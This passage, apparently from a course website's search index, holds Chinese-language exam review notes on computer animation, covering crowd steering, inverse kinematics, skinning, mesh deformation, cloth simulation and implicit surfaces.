\u8def\u5f84\u8ddf\u968f\u6a21\u578b:\n    - \u6cbf\u7740\u4e00\u6761\u8def\u5f84\u79fb\u52a8\u89d2\u8272\uff0c\u5e76\u540c\u65f6\u4fdd\u6301\u5728\u810a\u67f1\u7ebf\u7684\u6307\u5b9a\u534a\u5f84\u5185\n    - \u6295\u5f71\u8ddd\u79bb\u5c0f\u4e8e\u8def\u5f84\u534a\u5f84\u65f6\uff0c\u4e0d\u9700\u8981\u8fdb\u884c\u5bfc\u822a\u6821\u6b63\uff1b\u5426\u5219\uff0c\u628a\u9884\u6d4b\u7684\u4f4d\u7f6e\u6295\u5f71\u5230\u8def\u5f84\u4e0a\uff0c\u628a\u8be5\u70b9\u4f5c\u4e3a\u76ee\u6807\u70b9\uff0c\u5e76\u8fdb\u884c\u5bfb\u627e\u884c\u4e3a\n\n&gt; ![](../../Images/2023-11-08-20-15-21.png)\n\n- \u6d41\u573a\u8ddf\u968f\u884c\u4e3a\u6a21\u578b\n    - \u5047\u8bbe\u8fd0\u52a8\u533a\u57df\u5df2\u7ecf\u6709\u4e00\u4e2a\u901f\u5ea6\u6d41\u573a  \n    - \u4f30\u7b97\u89d2\u8272\u5c06\u6765\u7684\u4f4d\u7f6e\u5e76\u8ba1\u7b97\u5728\u8fd9\u70b9\u7684\u6d41\u573a  \n    - \u5f97\u5230\u7684\u901f\u5ea6 (F) \u5373\u4e3a\u6211\u4eec\u671f\u671b\u7684\u901f\u5ea6\uff0c\u5bfc\u822a\u65b9\u5411 (S) \u4e3a\u671f\u671b\u901f\u5ea6\u548c\u5f53\u524d\u901f\u5ea6\u7684\u5dee\n\n&gt; ![](../../Images/2023-11-08-20-15-30.png)\n\n- \u9886\u5bfc\u6a21\u578b\n    - \u5982\u679c\u4e00\u4e2a\u8ddf\u968f\u6210\u5458\u53d1\u73b0\u81ea\u5df1\u5904\u4e8e\u9886\u5bfc\u524d\u9762\u7684\u4e00\u4e2a\u77e9\u5f62\u533a\u57df\uff0c\u5b83\u4f1a\u6a2a\u5411\u8fdc\u79bb\u9886\u5bfc\u8005\u7684\u8def\u5f84\uff1b\u5426\u5219\uff0c\u5230\u8fbe (arrival) \u76ee\u6807\u4e3a\u9886\u5bfc\u540e\u9762\u7684\u4e00\u4e2a\u504f\u79fb\u70b9\n    - \u8ddf\u968f\u6210\u5458\u91c7\u7528\u5206\u79bb\u884c\u4e3a\u6765\u907f\u514d\u76f8\u4e92\u62e5\u6324\n\n&gt; ![](../../Images/2023-11-08-20-15-38.png)\n</code></pre> <pre><code>title: Helbing \u57fa\u4e8e\u793e\u4f1a\u529b\u6a21\u578b\u7684\u7fa4\u4f53\u884c\u4e3a\u6a21\u62df\u65b9\u6cd5\u7684\u57fa\u672c\u539f\u7406\n\n- \u793e\u4f1a\u529b\u6a21\u578b\u4ee5\u725b\u987f\u52a8\u529b\u5b66\u4e3a\u57fa\u7840\uff0c\u7531\u5404\u4e2a\u529b\u7684\u8868\u8fbe\u5f0f\u6765\u4f53\u73b0\u884c\u4eba\u4e0d\u540c\u7684\u52a8\u673a\u548c\u5f71\u54cd\u3002\u5728 **\u793e\u4f1a\u529b\u6a21\u578b** \u4e2d\uff0c\u7531\u4e8e\u5bf9\u5f71\u54cd\u4e2a\u4f53\u7684\u56e0\u7d20\u8003\u8651\u5f97\u6bd4\u8f83\u5168\u9762\uff0c\u5bf9\u4e2a\u4f53\u884c\u4e3a\u7684\u5efa\u6a21\u6bd4\u8f83\u5408\u7406\uff0c\u8be5\u6a21\u578b\u53ef\u4ee5\u903c\u771f\u5730\u6a21\u62df\u4eba\u7fa4\u7684\u758f\u6563\u8fc7\u7a0b\u3002\u00a0  \n- \u4e2a\u4f53\u7684\u5b9e\u9645\u884c\u4e3a\u53d7 **\u4e3b\u89c2\u610f\u8bc6\uff0c\u5176\u5b83\u4e2a\u4f53\u53ca\u969c\u788d\u7269** \u4e09\u65b9\u9762\u56e0\u7d20\u7684\u5f71\u54cd\uff0c\u5747\u53ef\u7b49\u6548\u4e3a\u529b\u5728\u4e2a\u4f53\u4e0a\u7684\u4f5c\u7528\u3002\n</code></pre> <pre><code>title: \u76f8\u4e92\u901f\u5ea6\u969c\u788d\u7269 (RVO) \u539f\u7406\n\n- \u5047\u8bbe\u4e2a\u4f53\u4ee5\u5300\u901f\u524d\u8fdb\uff1b\n- \u6bcf\u4e2a\u4e2a\u4f53\u5728\u4fdd\u6301\u4e0e\u5468\u56f4\u4e2a\u4f53\u76f8\u5bf9\u8fd0\u52a8\u7684\u540c\u65f6\uff0c\u5728\u901f\u5ea6\u57df\u4e2d\u8ba1\u7b97\u51fa\u53ef\u80fd\u5bfc\u81f4\u78b0\u649e\u7684\u901f\u5ea6\u96c6\u5408\uff0c\u5e76\u5bf9\u81ea\u8eab\u901f\u5ea6\u8fdb\u884c\u5fc5\u8981\u7684\u8c03\u6574\uff08\u9009\u62e9\u5f53\u524d\u901f\u5ea6\u548c\u4e00\u4e2a\u4f4d\u4e8e\u901f\u5ea6\u969c\u788d\u7269\u5916\u90e8\u7684\u901f\u5ea6\u7684\u5e73\u5747\uff09\n- \u5728\u8c03\u6574\u8fc7\u7a0b\u4e2d\uff0c\u78b0\u649e\u907f\u514d\u7684\u4efb\u52a1\u540c\u65f6\u5206\u914d\u7ed9\u76f8\u5173\u7684\u4e2a\u4f53\uff0c\u4f7f\u5b83\u4eec\u76f8\u4e92\u534f\u8c03\u5b8c\u6210\u78b0\u649e\u907f\u514d\u4efb\u52a1\n\n&gt; ![](../../Images/2023-11-08-20-15-49.png)\n&gt; ![](../../Images/2023-11-08-20-15-58.png)\n</code></pre>"}, {"location": "Course/Computer-Animation/FinalExam/#_9", "title": "\u5173\u8282\u52a8\u753b", "text": "<pre><code>title: \u8fd0\u52a8\u6355\u83b7\u7cfb\u7edf (MOCAP) \u6d41\u6c34\u7ebf\n\n\u6807\u5b9a -&gt; \u6355\u83b7 -&gt; \u4e09\u7ef4\u4f4d\u7f6e\u91cd\u5efa -&gt; \u62df\u5408\u5230\u9aa8\u67b6 -&gt; \u540e\u5904\u7406\n</code></pre> <pre><code>title: \u57fa\u4e8e\u8fd0\u52a8\u6355\u83b7\u7684\u5173\u8282\u52a8\u753b\u5236\u4f5c\u7684\u4f18\u7f3a\u70b9\n\n- \u4f18\u70b9\uff1a\u53ea\u8981\u80fd\u88ab\u6355\u83b7\uff0c\u53ef\u4ee5\u8bb0\u5f55\u4eba\u4f53\u8fd0\u52a8\u7684\u6240\u6709\u7ec6\u8282\uff0c\u8fd0\u52a8\u771f\u5b9e\n- \u7f3a\u70b9\uff1a\u4e0d\u5bb9\u6613\u8fdb\u884c\u7f16\u8f91\u548c\u63a7\u5236\uff0c\u8f83\u6602\u8d35\n</code></pre> <p>\u6b63\u5411\u8fd0\u52a8\u5b66\u3001\u9006\u5411\u8fd0\u52a8\u5b66\u539f\u7406 (IK)\uff0c\u9006\u5411\u96c5\u514b\u6bd4\u65b9\u6cd5\u6c42\u89e3 IK \u7684\u539f\u7406</p> <p>\u6b63\u5411\u8fd0\u52a8\u5b66 (FK) \u539f\u7406</p> <ul> <li>\u52a8\u753b\u5e08\u901a\u8fc7 \u76f4\u63a5\u6307\u5b9a \u5173\u8282\u5904\u7684\u5173\u8282\u8fd0\u52a8\u53c2\u6570\u6765\u63a7\u5236\u7269\u4f53\u7684\u8fd0\u52a8</li> <li>\u4ece\u5173\u8282\u7a7a\u95f4\u6620\u5c04\u5230\u7b1b\u5361\u5c14\u7a7a\u95f4\uff1b\u00a0  </li> <li>\u8ba1\u7b97\u6574\u68f5\u6811\uff08\u6df1\u5ea6\u4f18\u5148\u904d\u5386\uff09 <p></p> </li> </ul> <p>\u9006\u5411\u8fd0\u52a8\u5b66 (IK) \u539f\u7406</p> <ul> <li>\u52a8\u753b\u5e08\u6307\u5b9a\u76ee\u6807\u4f4d\u7f6e\uff0c\u7cfb\u7edf\u6c42\u89e3\u6ee1\u8db3\u8981\u6c42\u7684\u5173\u8282\u89d2\uff1b</li> <li>\u4ece\u7b1b\u5361\u5c14\u7a7a\u95f4\u6620\u5c04\u5230\u5173\u8282\u7a7a\u95f4\uff1b</li> <li>\u7ed9\u5b9a\u521d\u59cb\u59ff\u6001\u5411\u91cf\u548c\u76ee\u6807\u59ff\u6001\u5411\u91cf\uff0c\u8ba1\u7b97\u5173\u8282\u5411\u91cf\u7684\u503c\uff0c\u4f7f\u5f97\u7269\u4f53\u6ee1\u8db3\u6240\u9700\u7684\u59ff\u52bf\uff1b</li> <li>\u4e00\u65e6\u5f97\u5230\u5173\u8282\u5411\u91cf\u503c\u540e\uff0c\u53ef\u4ee5\u5bf9\u89d2\u8272\u7684\u521d\u59cb\u59ff\u6001\u548c\u6700\u7ec8\u59ff\u6001\u7684\u5173\u8282\u5411\u91cf\u503c\u8fdb\u884c\u63d2\u503c\uff0c\u4ece\u800c\u5f97\u5230\u89d2\u8272\u52a8\u753b\uff1b</li> </ul> <p>\u9006\u5411\u96c5\u514b\u6bd4\u6c42\u89e3 IK \u7684\u539f\u7406</p> <ul> <li>\u9006\u5411\u96c5\u514b\u6bd4\u77e9\u9635\u628a\u7b1b\u5361\u5c14\u7a7a\u95f4\u7684\u901f\u5ea6\u6620\u5c04\u5230\u5173\u8282\u7a7a\u95f4\u7684\u901f\u5ea6: \\(V = J(\\theta) \\dot{\\theta}\\)</li> </ul> <ul> <li>\u9006\u5411\u96c5\u514b\u6bd4\u95ee\u9898\u4e3a\uff1a\\(\\theta = f^{-1} (X)\\) (\\(f\\) \u662f\u4e00\u4e2a\u9ad8\u5ea6\u975e\u7ebf\u6027\u51fd\u6570)</li> <li>\u901a\u8fc7\u628a\u96c5\u514b\u6bd4\u77e9\u9635\u6c42\u9006\uff0c\u628a\u8be5\u95ee\u9898\u5728\u5f53\u524d\u4f4d\u7f6e\u5c40\u90e8\u7ebf\u6027\u5316\uff1a\\(\\dot{\\theta} = J^{-1} V\\)</li> <li>\u901a\u8fc7\u4e00\u7cfb\u5217\u589e\u91cf\u6b65\u9aa4\uff0c\u8fed\u4ee3\u5230\u6240\u9700\u7684\u4f4d\u7f6e</li> </ul> <ul> <li>\u7ed9\u5b9a\u521d\u59cb\u59ff\u52bf\u548c\u6240\u9700\u8981\u7684\u59ff\u52bf\uff0c\u8fed\u4ee3 \u53d8\u5316\u5173\u8282\u89d2\uff0c\u4f7f\u5f97\u672b\u7aef\u5f71\u54cd\u5668\u671d\u76ee\u6807\u4f4d\u7f6e\u548c\u65b9\u5411\u524d\u8fdb\uff1b\u00a0  <ul> <li>\u5bf9\u4e8e\u4e2d\u95f4\u5e27\uff0c\u63d2\u503c\u5f97\u5230\u6240\u9700\u7684\u59ff\u6001\u5411\u91cf<ul> <li>\u5bf9\u4e8e\u6bcf\u4e00\u6b65 k, \u901a\u8fc7\u4e0a\u8ff0\u516c\u5f0f\u5f97\u5230\u5173\u8282\u7684\u89d2\u901f\u5ea6 \\(\\dot{\\theta}\\) \uff0c\u7136\u540e\u6267\u884c \\(\\theta_{k+1} = \\theta_k + \\Delta t \\dot{\\theta}\\)</li> </ul> </li> </ul> </li> </ul> <pre><code>title: \u5faa\u73af\u5750\u6807\u4e0b\u964d\u6cd5 (CCD) \u539f\u7406\n\n- \u5bf9\u6240\u6709\u53d7 IK \u5f71\u54cd\u7684\u9aa8\u9abc\uff0c\u6309\u4ece\u6700\u8fdc\u4fa7\u5b50\u9aa8\u9abc\u5230\u7236\u9aa8\u9abc\u7684\u987a\u5e8f\u6267\u884c\u8fed\u4ee3\u64cd\u4f5c\uff1a\u65cb\u8f6c\u5f53\u524d\u9aa8\u9abc\uff0c\u4f7f\u5f53\u524d\u9aa8\u9abc\u4f4d\u7f6e\u5230\u76ee\u6807\u9aa8\u9abc\u7684\u8fde\u7ebf\u6307\u5411 IK \u76ee\u6807\u4f4d\u7f6e\n\n&gt; \u7531\u4e8e\u6240\u6709\u9aa8\u9abc\u662f\u4ece\u4e00\u4e2a\u7279\u5b9a\u72b6\u6001\u51fa\u53d1\u5f00\u59cb IK \u8ba1\u7b97\uff0c\u6240\u5f97\u5230\u7684\u7ed3\u679c\u4e5f\u4f1a\u6bd4\u8f83\u7a33\u5b9a\u3002\u901a\u5e38 5 \uff5e 10 \u6b21\u8fed\u4ee3\u4e4b\u540e\u5c31\u80fd\u5f97\u5230\u5f88\u597d\u7684\u7ed3\u679c\n\n![](../../Images/2023-11-08-20-16-23.png)\n</code></pre> <pre><code>title: \u9aa8\u67b6\u4e0e\u89d2\u8272\u6a21\u578b\u7684\u7ed1\u5b9a\u539f\u7406\n\n- &lt;u&gt;\u89d2\u8272\u7684\u8868\u9762\uff08\u5916\u76ae\uff09\u5fc5\u987b\u968f\u7740\u9aa8\u67b6\u7684\u8fd0\u52a8\u800c\u8fd0\u52a8\uff08\u53d8\u5f62\uff09&lt;/u&gt;\n- \u5728\u9aa8\u67b6\u7ed1\u5b9a\u4e2d\uff0c\u76ae\u80a4\u7684\u8fd0\u52a8\u5b9a\u4e49\u4e3a\u5bf9\u5e94\u63a7\u5236\u9aa8\u67b6\u7684\u51fd\u6570\uff1b\n- \u5f88\u591a\u9aa8\u67b6\u7ed1\u5b9a\u7cfb\u7edf\u91c7\u7528\u4e00\u4e2a\u79f0\u4e3a\u4e2d\u6027\u59ff\u52bf\u6216\u9759\u6b62\u59ff\u52bf\u7684\u51e0\u4f55\u4fe1\u606f\uff1b\n- \u81ea\u52a8\u7ed1\u5b9a\u4e3b\u8981\u5305\u62ec\u4e24\u4e2a\u8fc7\u7a0b\uff1a\n    - \u9996\u5148\u5728\u672a\u77e5\u7684\u4e09\u7ef4\u6a21\u578b\u4e2d\u5d4c\u5165\u9aa8\u67b6\n    - \u7136\u540e\u8ba1\u7b97\u9aa8\u9abc\u5bf9\u8868\u9762\u7f51\u683c\u4e0a\u6bcf\u4e2a\u9876\u70b9\u7684\u5f71\u54cd\u6743\u503c\uff0c\u5e76\u5c06\u8868\u9762\u76ae\u80a4\u4f9d\u9644\u5728\u9aa8\u9abc\u4e0a\n</code></pre> <p>\u9876\u70b9\u6df7\u5408 (Vertex Blending) \u7684\u539f\u7406\u548c\u6570\u5b66\u8868\u793a</p> <p>\u539f\u7406</p> <ul> <li>\u5047\u8bbe\u4e00\u4e2a\u6570\u5b57\u89d2\u8272\u7684\u624b\u81c2\u7528\u524d\u81c2\u548c\u540e\u81c2\u6765\u6a21\u62df\uff0c\u6700\u7b80\u5355\u7684\u9876\u70b9\u6df7\u5408\u65b9\u6cd5\u662f\u524d\u81c2\u548c\u540e\u81c2\u5355\u72ec\u8bbe\u7f6e\u52a8\u753b\uff0c\u4f46\u5173\u8282\u5904\u7528\u4e00\u67d4\u6027\u7684 \u201cskin\u201d \u6765\u8fde\u63a5</li> <li>\u67d4\u6027\u90e8\u5206\u7684\u4e00\u90e8\u5206\u9876\u70b9\u7531\u524d\u81c2\u7684\u77e9\u9635\u6765\u53d8\u6362\uff0c\u53e6\u4e00\u90e8\u5206\u7531\u540e\u81c2\u7684\u77e9\u9635\u6765\u53d8\u6362\u3002\u5373\uff1a\u4e00\u4e2a\u4e09\u89d2\u5f62\u7684\u9876\u70b9\u53ef\u4ee5\u7531\u4e0d\u540c\u7684\u77e9\u9635\u6765\u53d8\u6362\uff0c\u800c\u4e0d\u662f\u4e00\u4e2a\u77e9\u9635\u3002\u8fd9\u79cd\u57fa\u672c\u6280\u672f\u6709\u65f6\u4e5f\u79f0\u4e3a \u201cStitching\u201d</li> <li>\u8fdb\u4e00\u6b65\u63a8\u5e7f\uff1a\u4e00\u4e2a\u9876\u70b9\u53ef\u4ee5\u7531\u51e0\u4e2a\u4e0d\u540c\u7684\u77e9\u9635\u8fdb\u884c\u52a0\u6743\u53d8\u6362</li> <li>\u5b9e\u65bd\u65b9\u6cd5\uff1a\u5728\u7269\u4f53\u4e0a\u653e\u7f6e\u5173\u8282\u9aa8\u67b6\uff0c\u6bcf\u4e2a\u9aa8\u67b6\u90fd\u6309\u7528\u6237\u7ed9\u5b9a\u7684\u6743\u56e0\u5b50\u5f71\u54cd\u9876\u70b9</li> </ul> <p>\u6570\u5b66\u8868\u793a</p> <p> </p>"}, {"location": "Course/Computer-Animation/FinalExam/#_10", "title": "\u53d8\u5f62\u52a8\u753b", "text": "<pre><code>title: \u57fa\u4e8e Blend Shapes \u8868\u60c5\u52a8\u753b\u7684\u539f\u7406\n\n- \u9996\u5148\u5bf9\u4eba\u8138\u8868\u60c5\u8fdb\u884c\u4e09\u7ef4\u626b\u63cf\uff0c\u7136\u540e\u6784\u5efa\u4e00\u7ec4\u5173\u952e\u59ff\u6001\u8868\u60c5\u7684\u5f62\u72b6 --- Blend Shapes\n- \u628a\u8fd9\u4e9b\u57fa\u672c\u7684\u4eba\u8138 Shape \u4f5c\u4e3a\u8868\u60c5\u57fa&lt;br&gt;![](../../Images/2023-11-08-20-17-07.png)\n- \u6839\u636e\u63d2\u503c\u8fd9\u4e9b Blend Shapes \u6765\u5f97\u5230\u4efb\u610f\u7684\u8868\u60c5&lt;br&gt;![](../../Images/2023-11-08-20-17-14.png)\n</code></pre> <pre><code>title: FACE IK \u7684\u539f\u7406\n\n![](../../Images/2023-11-08-20-17-22.png)\n![](../../Images/2023-11-08-20-17-28.png)\n</code></pre> <pre><code>title: Deformation \u4e0e Morphing \u7684\u533a\u522b\n\n- \u53d8\u5f62 Deformation \u662f\u6307\u5c06\u51e0\u4f55\u5bf9\u8c61\u7684\u5f62\u72b6\u4f5c\u67d0\u79cd\u626d\u66f2\uff0c\u5f62\u53d8\uff0c\u4f7f\u5b83\u5f62\u6210\u52a8\u753b\u5e08\u6240\u9700\u8981\u7684\u5f62\u72b6\u3002\u5728\u8fd9\u79cd\u53d8\u5316\u4e2d\uff0c**\u51e0\u4f55\u5bf9\u8c61\u7684\u62d3\u6251\u5173\u7cfb\u4fdd\u6301\u4e0d\u53d8** \n- \u4e0e Morphing \u4e0d\u540c\uff0c\u7a7a\u95f4\u53d8\u5f62\u66f4\u5177\u6709\u67d0\u79cd\u968f\u610f\u6027\uff0c\u6240\u4ee5\u7a7a\u95f4\u53d8\u5f62\u4e5f\u5e38\u79f0\u4e3a\u81ea\u7531\u53d8\u5f62\n</code></pre> <pre><code>title: \u4e0e\u7269\u4f53\u8868\u793a\u65e0\u5173\u7684\u53d8\u5f62\u7684\u539f\u7406\n\n- \u65e2\u53ef\u4ee5\u7528\u4e8e\u591a\u8fb9\u5f62\u8868\u793a\u7684\u7269\u4f53\uff0c\u53c8\u53ef\u4ee5\u7528\u4e8e\u53c2\u6570\u66f2\u9762\u8868\u793a\u7684\u7269\u4f53\n- \u7528\u5c11\u91cf\u7684\u70b9\u53bb\u6709\u6548\u63a7\u5236\u66f4\u591a\u7684\u70b9\u3002\u5728\u4f20\u7edf CSG \u9020\u578b (\u4f53\u7d20\u9020\u578b)\u65b9\u6cd5\u7684\u57fa\u7840\u4e0a\uff0c\u8fdb\u884c\u975e\u7ebf\u6027\u6574\u4f53\u53d8\u5f62\uff08\u53d8\u6362\u662f\u7269\u4f53\u9876\u70b9\u4f4d\u7f6e\u7684\u51fd\u6570\uff09\u548c\u5c40\u90e8\u5909\u5f62\uff08\u6539\u53d8\u7269\u4f53\u7684\u5207\u5411\u91cf\u7a7a\u95f4\uff0c\u79ef\u5206\u5f97\u5230\u7269\u4f53\u53d8\u5f62\u540e\u7684\u6574\u4f53\u4f4d\u7f6e\uff09\n</code></pre> <pre><code>title: \u6269\u5c55\u7684 FFD \u65b9\u6cd5 EFFD \u7684\u539f\u7406\n\n- FFD (\u4e0d\u76f4\u63a5\u64cd\u4f5c\u7269\u4f53\uff0c\u800c\u662f\u5c06\u7269\u4f53\u5d4c\u5165\u4e00\u7a7a\u95f4\uff0c\u5f53\u6240\u5d4c\u7684\u7a7a\u95f4\u53d8\u5f62\u65f6\uff0c\u7269\u4f53\u4e5f\u968f\u4e4b\u53d8\u5f62) \u53ea\u9002\u5408\u5e73\u884c\u516d\u9762\u4f53\u7684 lattice \u5f62\u72b6\uff0c\u6269\u5c55\u7684 FFD \u65b9\u6cd5\u5141\u8bb8\u975e\u5e73\u884c\u516d\u9762\u4f53\u7684 lattice \u5f62\u72b6\uff0c\u4ece\u800c\u80fd\u5b9e\u73b0\u66f4\u4efb\u610f\u7684\u53d8\u5f62\u3002\n- EFFD \u578b lattice \u5141\u8bb8 FFD \u578b lattice \u4f5c\u4e3a\u5b83\u7ed3\u6784\u7684\u4e00\u90e8\u5206\uff0c\u8bb8\u591a\u4e2a FFD \u578b lattice \u53ef\u5408\u5e76\u6784\u6210 EFFD \u7684 lattice\u3002\u901a\u8fc7\u628a\u591a\u4e2a\u57fa\u672c EFFD \u5757\u878d\u5408\uff0c\u5f97\u5230\u66f4\u590d\u6742\u7684\u590d\u5408 EFFD \u5757\u3002\u4f7f\u7528\u8fed\u4ee3\u6c42\u89e3\u91c7\u7528 EFFD \u5757\u5bf9\u7269\u4f53\u8fdb\u884c\u53d8\u5f62\n\n&gt; ![](../../Images/2023-11-08-20-17-40.png)\n&gt; ![](../../Images/2023-11-08-20-17-48.png)\n</code></pre> <pre><code>title: \u57fa\u4e8e Cage \u7684\u53d8\u5f62\u539f\u7406\n\n- \u6784\u5efa\u6a21\u578b\u7684 Cage\uff08\u4e00\u4e2a\u5305\u88f9\u9ad8\u5206\u8fa8\u7387\u6a21\u578b\u7684\u4f4e\u5206\u8fa8\u7387\u63a7\u5236\u7f51\u683c\uff09\uff1b\n- \u8ba1\u7b97\u6a21\u578b\u7684 Cage \u5750\u6807;\n- \u7f16\u8f91 Cage \u6a21\u578b;\n- \u628a Cage \u7684\u53d8\u5f62\u901a\u8fc7\u9884\u5148\u8ba1\u7b97\u7684 Cage \u5750\u6807\u5149\u6ed1\u4f20\u64ad\u5230\u5176\u5305\u88f9\u7684\u6a21\u578b\n</code></pre> <p>Laplacian \u5fae\u5206\u5750\u6807\u53ca\u5176\u53d8\u5f62\u539f\u7406</p> <ul> <li>\u62c9\u666e\u62c9\u65af\u5750\u6807 (\\(\\delta\\) - Coordinate) \u2014 \u5c06\u6bcf\u4e2a\u9876\u70b9\u7684\u7b1b\u5361\u5c14\u5750\u6807\u8f6c\u6362\u4e3a\u62c9\u666e\u62c9\u65af\u5750\u6807 (\u6570\u5b66\u610f\u4e49\u4e3a\u4e00\u4e2a\u9876\u70b9\u7684\u7b1b\u5361\u5c14\u5750\u6807\u548c\u8fd9\u4e2a\u70b9\u6240\u6709\u90bb\u63a5\u70b9\u7684\u7b1b\u5361\u5c14\u5750\u6807\u7684\u52a0\u6743\u5e73\u5747\uff0c\u7269\u7406\u610f\u4e49\u4e3a\u62c9\u666e\u62c9\u65af\u5750\u6807\u80fd\u591f\u8bb0\u5f55\u6a21\u578b\u7684\u5c40\u90e8\u7ec6\u8282\u7279\u5f81)\uff1a</li> </ul> \\[\\begin{align} \\delta_i &amp;= (\\delta_i^{(x)},~ \\delta_i^{(y)},~ \\delta_i^{(z)}) \\\\ &amp;= \\mathbf{v}_i - \\frac{1}{d_i} \\sum\\limits_{j \\in N(i)} \\mathbf{v}_j \\end{align}\\] <ul> <li>\u4ece\u5fae\u5206\u51e0\u4f55\u4e0a\uff0c\u62c9\u666e\u62c9\u65af\u5750\u6807\u5199\u6210\u4e0b\u5f0f\uff1a</li> </ul> \\[\\delta_i =  \\frac{1}{d_i} \\sum\\limits_{j \\in N(i)} (\\mathbf{v}_i - \\mathbf{v}_j)\\] <ul> <li>\u539f\u7406\uff1a\u4f7f\u5f62\u53d8\u524d\u7684\u70b9\u7684\u62c9\u666e\u62c9\u65af\u5750\u6807\u4e0e\u5f62\u53d8\u540e\u7684\u70b9\u7684\u62c9\u666e\u62c9\u65af\u5750\u6807\u5728\u5c40\u90e8\u5750\u6807\u7cfb\u5185\u5c3d\u53ef\u80fd\u76f8\u7b49</li> </ul>"}, {"location": "Course/Computer-Animation/FinalExam/#_11", "title": "\u5e03\u6599\u52a8\u753b", "text": "<pre><code>title: \u5e03\u6599\u52a8\u753b\u548c\u4eff\u771f\u4e2d\u7684\u6838\u5fc3\u95ee\u9898\u6709\u54ea 4 \u4e2a\n\n1. \u5efa\u7acb\u5e03\u6599\u7684\u7269\u7406\uff08\u529b\u5b66\uff09\u6a21\u578b\uff08\u8868\u8fbe\u80fd\u529b\uff09\n2. \u5e03\u6599\u7269\u7406\u53c2\u6570\u7684\u786e\u5b9a\n3. \u7269\u7406\u6a21\u578b\u7684\u6c42\u89e3\n4. \u78b0\u649e\u68c0\u6d4b\u548c\u54cd\u5e94\n</code></pre> <pre><code>title: \u5e03\u6599\u7684\u7269\u7406\u673a\u68b0\u6027\u80fd\u4e3b\u8981\u6709\u54ea 4 \u79cd\n\n\u62c9\u4f38\u529b\u3001\u538b\u7f29\u529b\u3001\u526a\u5207\u529b\u548c\u5f2f\u66f2\u529b\n</code></pre> <pre><code>title: \u5e03\u6599\u7684\u5f39\u7c27-\u8d28\u70b9\u6a21\u578b\u4e3b\u8981\u6709\u54ea 3 \u79cd\u5f39\u7c27\uff0c\u5e76\u56fe\u793a\n\n![](../../Images/2023-11-08-20-17-58.png)\n</code></pre> <pre><code>title: Provot \u7684\u8863\u670d\u6a21\u578b\u7684\u539f\u7406\n\n- Provot \u63d0\u51fa\u4e86\u4e00\u79cd\u53ef\u4ee5\u770b\u4f5c\u662f\u4ece Breen \u7684\u7c92\u5b50\u7cfb\u7edf\uff08\u628a\u5e03\u6599\u6a21\u578b\u8868\u793a\u6210\u4e3a\u4e00\u5957\u76f8\u4e92\u4f5c\u7528\u7684\u7c92\u5b50\u7cfb\u7edf\uff09\u7b80\u5316\u800c\u6765\u7684\u5f39\u7c27-\u8d28\u70b9\u6a21\u578b\uff0c\u5e76\u5728\u6b64\u57fa\u7840\u4e0a\u53d1\u5c55\u4e86\u4e00\u5957\u975e\u5e38\u7b80\u5355\u6709\u6548\u7684\u7b97\u6cd5\u3002\n- Provot \u91c7\u7528\u4e86\u7b80\u5355\u9ad8\u6548\u7684\u663e\u5f0f Euler \u6cd5\u6c42\u89e3\u5fae\u5206\u65b9\u7a0b\u7ec4\uff0c\u6548\u7387\u4e0e\u663e\u793a\u6548\u679c\u5747\u4e0d\u9519\n\n&gt; ![](../../Images/2023-11-08-20-18-06.png)\n&gt; ![](../../Images/2023-11-08-20-18-14.png)\n</code></pre> <pre><code>title: \u5e03\u6599\u52a8\u753b\u4e2d\u5927\u6b65\u957f\u9690\u5f0f\u65b9\u6cd5\u7684\u539f\u7406\n\n- \u5e03\u6599\u6a21\u62df\u7684\u79ef\u5206\u8ba1\u7b97\u90e8\u5206\u7684\u4e3b\u8981\u5f00\u9500\u5728\u7531\u4e8e\u7a33\u5b9a\u6027\u9650\u5236\u8ba1\u7b97\u6b65\u957f\u53ea\u80fd\u53d6\u5f88\u5c0f\u503c\uff0c\u56e0\u800c\u88ab\u8feb\u5728\u4e24\u5e27\u753b\u9762\u4e4b\u95f4\u8ba1\u7b97\u591a\u6b21\uff1b\u00a0  \n- &lt;u&gt;\u56e0\u6b64\u8bbe\u6cd5\u53d6\u8f83\u5927\u7684\u65f6\u95f4\u6b65\u957f\u53ef\u4ee5\u6709\u6548\u63d0\u9ad8\u7b97\u6cd5\u6548\u7387\u3002\u4f7f\u7528\u9690\u5f0f\u65b9\u6cd5\u6765\u79ef\u5206\uff0c\u5728\u4e0d\u964d\u4f4e\u521a\u5ea6\u7684\u6761\u4ef6\u4e0b\u53ef\u4ee5\u53d6\u5f97\u8f83\u5927\u7684\u65f6\u95f4\u6b65\u957f&lt;/u&gt;\n\n&gt; ![](../../Images/2023-11-08-20-18-28.png)\n</code></pre>"}, {"location": "Course/Computer-Animation/FinalExam/#_12", "title": "\u9690\u51fd\u6570\u66f2\u9762\u9020\u578b\u548c\u52a8\u753b\u6280\u672f", "text": "<pre><code>title: \u9690\u5f0f\u66f2\u9762\u8868\u793a\u7684\u4f18\u7f3a\u70b9\n\n- \u4f18\u70b9\uff1a\n    1. \u5f88\u5bb9\u6613\u8fdb\u884c\u70b9\u7684\u5185\u5916\u6d4b\u8bd5 \n    2. \u5f88\u5bb9\u6613\u8ba1\u7b97\u66f2\u9762\u7684\u4ea4/\u5dee/\u5e76\u00a0  \n    3. \u5f88\u5bb9\u6613\u5904\u7406\u62d3\u6251\u53d8\u5316\n- \u7f3a\u70b9\uff1a\n    1. \u66f2\u9762\u901a\u8fc7\u95f4\u63a5\u6307\u5b9a\u00a0  \n    2. \u5f88\u96be\u63cf\u8ff0\u5c16\u9510\u7279\u5f81\u00a0  \n    3. \u5f88\u96be\u5bf9\u66f2\u9762\u4e0a\u7684\u70b9\u8fdb\u884c\u679a\u4e3e\u00a0  \n    4. \u7ed8\u5236\u6162\n</code></pre> <pre><code>title: \u9690\u5f0f\u66f2\u9762\u4e2d\u6838\u51fd\u6570\u7684\u9009\u62e9\n\n- \u9009\u62e9\u4f4e\u901a\u6ee4\u6ce2\u51fd\u6570\uff08\u4f8b\u5982\u9ad8\u65af\u51fd\u6570\uff09\n\n![](../../Images/2023-11-08-20-18-36.png)\n</code></pre> <p>Wyvill \u7684\u516d\u6b21\u591a\u9879\u5f0f\u52bf\u51fd\u6570\u7684\u56fe\u5f62\u5f62\u72b6</p> \\[f_i(r) =  \\begin{cases} - \\frac{4}{9} (\\frac{r}{R_i})^6 + \\frac{17}{9} (\\frac{r}{R_i})^4 - \\frac{22}{9} (\\frac{r}{R_i})^2 + 1, &amp; 0 \\le r \\le R_i \\\\ 0, &amp;r \\ge R_i \\end{cases}\\] <p></p>"}, {"location": "Course/Computer-Animation/FinalExam/#_13", "title": "\u6570\u5b66\u77e5\u8bc6", "text": 